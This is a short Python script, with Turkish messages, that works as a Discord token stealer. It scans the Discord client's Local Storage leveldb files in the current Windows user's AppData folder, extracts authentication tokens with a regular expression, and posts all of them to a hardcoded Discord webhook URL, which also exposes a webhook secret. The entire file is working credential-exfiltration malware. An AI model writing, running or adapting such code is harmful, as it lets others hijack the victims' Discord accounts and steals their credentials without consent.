import os
import re
import requests

def find_discord_tokens(path):
    path = os.path.join(path, 'Local Storage', 'leveldb')
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    tokens = []

    if not os.path.exists(path):
        return tokens

    for filename in os.listdir(path):
        if not filename.endswith('.ldb') and not filename.endswith('.log'):
            continue

        try:
            with open(os.path.join(path, filename), 'r', errors='ignore') as file:
                contents = file.read()
                matches = token_regex.findall(contents)
                for token in matches:
                    if token not in tokens:
                        tokens.append(token)
        except:
            pass

    return tokens

def send_to_webhook(tokens):
    webhook_url = "https://discord.com/api/webhooks/1359538081140707561/hD-5HNa1lZlIlKmqakSZdvJN9UVTQflKvG_kAqeUX4Pezoffg-qxzkApWqjIbzwjsvVy"
    if not tokens:
        content = "❌ Token bulunamadı."
    else:
        content = "✅ Bulunan Tokenlar:\n" + "\n".join(f"`{token}`" for token in tokens)

    requests.post(webhook_url, json={"content": content})

if __name__ == "__main__":
    # Kendi bilgisayarındaki kullanıcı adını otomatik alır
    user = os.getenv("USERNAME")
    path = f"C:\\Users\\{user}\\AppData\\Roaming\\discord"
    tokens = find_discord_tokens(path)
    send_to_webhook(tokens)
